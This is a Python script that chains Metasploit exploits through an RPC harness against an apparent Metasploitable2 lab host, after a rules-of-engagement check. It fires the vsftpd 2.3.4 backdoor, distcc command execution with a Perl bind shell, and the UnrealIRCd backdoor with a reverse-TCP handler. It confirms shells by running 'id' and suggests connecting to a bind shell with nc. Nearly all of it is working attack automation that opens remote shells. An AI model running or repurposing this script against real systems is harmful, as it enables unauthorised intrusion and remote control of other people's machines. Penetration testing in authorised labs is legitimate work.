#!/usr/bin/env python3
"""Live Metasploitable2 attack via fixed RPC execute helpers."""
from __future__ import annotations

import json
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

TARGET = "10.255.255.254"
ENGAGEMENT = "lab-default"
EVIDENCE = ROOT / "evidence" / "msf"
EVIDENCE.mkdir(parents=True, exist_ok=True)


def save(name: str, data: dict) -> None:
    path = EVIDENCE / f"attack-{name}.json"
    path.write_text(json.dumps(data, indent=2, default=str), encoding="utf-8")
    print(f"  [evidence] {path.name}")


def get_wsl_ip() -> str:
    r = subprocess.run(
        ["wsl", "-e", "bash", "-lc",
         "ip -4 addr show eth0 | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' | head -1"],
        capture_output=True, text=True, timeout=10,
    )
    return r.stdout.strip() or "127.0.0.1"


def wait_session(client, timeout: int = 60) -> dict | None:
    initial = client.sessions.list
    initial_ids = set(initial.keys()) if isinstance(initial, dict) else set()
    deadline = time.time() + timeout
    while time.time() < deadline:
        sessions = client.sessions.list
        if isinstance(sessions, dict):
            new_ids = set(sessions.keys()) - initial_ids
            if new_ids:
                sid = list(new_ids)[0]
                return {"session_id": int(sid), "info": sessions[sid]}
            if sessions and not initial_ids:
                sid = list(sessions.keys())[0]
                return {"session_id": int(sid), "info": sessions[sid]}
        time.sleep(2)
    return None


def main() -> int:
    from msf_harness.mcp.policy.roe import enforce_roe
    from msf_harness.mcp.rpc.client import get_rpc, reset_client
    from msf_harness.mcp.rpc.execute import execute_module

    denial = enforce_roe(ENGAGEMENT, targets=TARGET)
    if denial:
        print("ROE DENIED:", denial)
        return 1

    reset_client()
    client = get_rpc()
    lhost = get_wsl_ip()
    lport = 4444
    print(f"=== Target: {TARGET} | LHOST: {lhost}:{lport} ===")

    # Attempt 1: vsftpd (bind shell on 6200)
    print("\n[1] vsftpd backdoor (9021)...")
    r1 = execute_module(
        client, "exploit", "unix/ftp/vsftpd_234_backdoor",
        {"RHOSTS": TARGET, "RPORT": "9021", "WfsDelay": 20},
    )
    save("vsftpd", {"job": r1})
    sess = wait_session(client, 25)
    if sess:
        print("  SESSION via vsftpd:", sess)
        save("session-vsftpd", sess)
        return interact(client, sess["session_id"])

    # Attempt 2: distcc bind shell
    print("\n[2] distcc bind shell (9632)...")
    r2 = execute_module(
        client, "exploit", "unix/misc/distcc_exec",
        {"RHOSTS": TARGET, "RPORT": "9632"},
        payload="cmd/unix/bind_perl",
    )
    save("distcc", {"job": r2})
    sess = wait_session(client, 30)
    if sess:
        print("  SESSION via distcc:", sess)
        save("session-distcc", sess)
        return interact(client, sess["session_id"])

    # Attempt 3: IRC reverse shell with handler
    print("\n[3] IRC reverse shell (9667)...")
    payload = "cmd/linux/http/x86/shell/reverse_tcp"
    h = execute_module(
        client, "exploit", "multi/handler",
        payload=payload,
        payload_options={"LHOST": lhost, "LPORT": str(lport)},
    )
    save("handler", {"job": h, "lhost": lhost, "lport": lport})
    time.sleep(2)

    r3 = execute_module(
        client, "exploit", "unix/irc/unreal_ircd_3281_backdoor",
        {"RHOSTS": TARGET, "RPORT": "9667"},
        payload=payload,
        payload_options={"LHOST": lhost, "LPORT": str(lport)},
    )
    save("irc", {"job": r3})
    sess = wait_session(client, 45)
    if sess:
        print("  SESSION via IRC:", sess)
        save("session-irc", sess)
        return interact(client, sess["session_id"])

    # Attempt 4: Try LHOST as docker gateway for IRC
    print("\n[4] IRC with LHOST=172.17.0.1 (docker gateway)...")
    dg = "172.17.0.1"
    execute_module(
        client, "exploit", "multi/handler",
        payload=payload,
        payload_options={"LHOST": dg, "LPORT": str(lport)},
    )
    execute_module(
        client, "exploit", "unix/irc/unreal_ircd_3281_backdoor",
        {"RHOSTS": TARGET, "RPORT": "9667"},
        payload=payload,
        payload_options={"LHOST": dg, "LPORT": str(lport)},
    )
    sess = wait_session(client, 30)
    if sess:
        print("  SESSION via IRC/docker gw:", sess)
        save("session-irc-dgw", sess)
        return interact(client, sess["session_id"])

    print("\n=== No MSF session obtained ===")
    print("Bind shell may be open on 10.255.255.254:6200 - try: wsl nc 10.255.255.254 6200")
    save("failed", {"sessions": client.sessions.list, "jobs": client.jobs.list})
    return 1


def interact(client, sid: int) -> int:
    print(f"\n=== Interacting with session {sid} ===")
    client.call("session.shell_write", [sid, "id\n"])
    time.sleep(3)
    out = client.call("session.shell_read", [sid])
    output = out.get("data", "")
    print("  id output:", output)
    save("id-output", {"session_id": sid, "output": output})
    if output.strip():
        print("\n*** SUCCESS: shell confirmed ***")
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
